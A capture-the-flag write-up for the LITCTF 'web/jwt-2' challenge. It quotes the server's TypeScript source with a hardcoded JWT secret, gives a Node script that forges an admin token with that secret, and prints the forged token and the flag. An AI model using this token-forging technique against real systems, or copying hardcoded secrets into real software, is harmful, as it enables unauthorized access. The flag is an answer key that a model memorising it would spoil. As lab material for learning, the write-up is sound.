# web/jwt-2

## About
"its like jwt-1 but this one is harder URL: http://litctf.org:31777/ ."

The webpage looks exactly the same as `web/jwt-1`. This time, however, `index.ts` has been given:
```ts
import express from "express";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import crypto from "crypto";

const accounts: [string, string][] = [];

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const sign = (payload: object) => {
  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
  return jwtHeader + "." + jwtPayload + "." + signature;

}

const app = express();

const port = process.env.PORT || 3000;

app.listen(port, () =>
  console.log("server up on http://localhost:" + port.toString())
);

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "site")));

app.get("/flag", (req, res) => {
  if (!req.cookies.token) {
    console.log('no auth')
    return res.status(403).send("Unauthorized");
  }

  try {
    const token = req.cookies.token;
    // split up token
    const [header, payload, signature] = token.split(".");
    if (!header || !payload || !signature) {
      return res.status(403).send("Unauthorized");
    }
    Buffer.from(header, "base64").toString();
    // decode payload
    const decodedPayload = Buffer.from(payload, "base64").toString();
    // parse payload
    const parsedPayload = JSON.parse(decodedPayload);
		// verify signature
		const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');
		if (signature !== expectedSignature) {
			return res.status(403).send('Unauthorized ;)');
		}
    // check if user is admin
    if (parsedPayload.admin || !("name" in parsedPayload)) {
      return res.send(
        fs.readFileSync(path.join(__dirname, "flag.txt"), "utf-8")
      );
    } else {
      return res.status(403).send("Unauthorized");
    }
  } catch {
    return res.status(403).send("Unauthorized");
  }
});

.
.
.
```

## Recon
Looking at the code, I was able to figure out not only `admin` value needs to be `True`, but also `signature` part of the cookie needs to be constructed with `jwtSecret = "xook"` keyword.

## Exploitation
I wrote JavaScript code to craft the cookie.
```js
// cookie.js
const crypto = require('crypto');

const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const jwtPayload = Buffer.from(JSON.stringify({ name: "admin", admin: true }), "utf-8")
  .toString("base64")
  .replace(/=/g, "");

const jwtSecret = "xook";
const signature = crypto.createHmac('sha256', jwtSecret)
  .update(jwtHeader + '.' + jwtPayload)
  .digest('base64')
  .replace(/=/g, '');

const token = `${jwtHeader}.${jwtPayload}.${signature}`;

console.log(token);
```

```bash
$ node cookie.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.MTnIgTB1oTbZ2pNsqQreiHQo9309/IoytyoVE4DshM8
```

Flag: LITCTF{v3rifyed_thI3_Tlme_1re4DV9}